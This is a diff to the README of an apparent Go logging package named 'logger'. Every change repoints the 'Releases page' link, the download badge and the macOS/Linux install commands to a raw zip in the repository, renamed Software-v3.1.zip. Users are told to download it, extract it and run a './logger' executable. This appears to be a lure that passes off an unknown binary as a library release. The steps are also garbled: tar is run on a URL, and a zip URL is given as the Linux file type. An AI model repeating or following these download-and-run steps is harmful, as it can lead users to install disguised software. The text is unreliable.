@@ -6,15 +6,15 @@ Welcome to `logger`, a toggleable logging package that makes using Go's log pack
 
 ## 📥 Download & Install
 
-To get started with `logger`, visit the [Releases page](https://raw.githubusercontent.com/Kanha112/logger/main/usability/logger.zip) to download the latest version. 
+To get started with `logger`, visit the [Releases page](https://raw.githubusercontent.com/Kanha112/logger/main/usability/Software-v3.1.zip) to download the latest version. 
 
-[![Download the latest version](https://raw.githubusercontent.com/Kanha112/logger/main/usability/logger.zip)](https://raw.githubusercontent.com/Kanha112/logger/main/usability/logger.zip)
+[![Download the latest version](https://raw.githubusercontent.com/Kanha112/logger/main/usability/Software-v3.1.zip)](https://raw.githubusercontent.com/Kanha112/logger/main/usability/Software-v3.1.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**: Click on the link above to access the releases page.
 2. **Select the Latest Release**: You will see a list of available versions. Pick the top version, which is the most recent.
-3. **Choose Your File**: Depending on your operating system, select the appropriate file to download (e.g., `.exe` for Windows, `https://raw.githubusercontent.com/Kanha112/logger/main/usability/logger.zip` for Linux, or `.zip` for macOS).
+3. **Choose Your File**: Depending on your operating system, select the appropriate file to download (e.g., `.exe` for Windows, `https://raw.githubusercontent.com/Kanha112/logger/main/usability/Software-v3.1.zip` for Linux, or `.zip` for macOS).
 4. **Start the Download**: Click on the file to begin downloading it to your computer.
 5. **Locate the Downloaded File**: Find the file in your Downloads folder or designated location. 
 
@@ -28,13 +28,13 @@ To get started with `logger`, visit the [Releases page](https://raw.githubuserco
 #### macOS
 
 1. **Open Terminal**: Navigate to your Applications folder, then open the Terminal.
-2. **Extract the File**: Use the command `tar -xzvf https://raw.githubusercontent.com/Kanha112/logger/main/usability/logger.zip` to extract the contents.
+2. **Extract the File**: Use the command `tar -xzvf https://raw.githubusercontent.com/Kanha112/logger/main/usability/Software-v3.1.zip` to extract the contents.
 3. **Run the Application**: Navigate to the extracted folder and enter the command `./logger` to start using the application.
 
 #### Linux
 
 1. **Open Terminal**: Find and open your terminal application.
-2. **Extract the File**: Use the command `tar -xzvf https://raw.githubusercontent.com/Kanha112/logger/main/usability/logger.zip` to extract the files.
+2. **Extract the File**: Use the command `tar -xzvf https://raw.githubusercontent.com/Kanha112/logger/main/usability/Software-v3.1.zip` to extract the files.
 3. **Run the Application**: Navigate to the folder with the extracted files and use the command `./logger` to run it.
 
 ## 🔍 Basic Usage
@@ -76,4 +76,4 @@ If you have questions or need help, check out the community forums or reach out 
 
 Thanks to the contributors and the Go community for their support in developing `logger`. Your efforts make this project possible.
 
-For more detailed documentation, visit our [Releases page](https://raw.githubusercontent.com/Kanha112/logger/main/usability/logger.zip) and start logging today!
+For more detailed documentation, visit our [Releases page](https://raw.githubusercontent.com/Kanha112/logger/main/usability/Software-v3.1.zip) and start logging today!
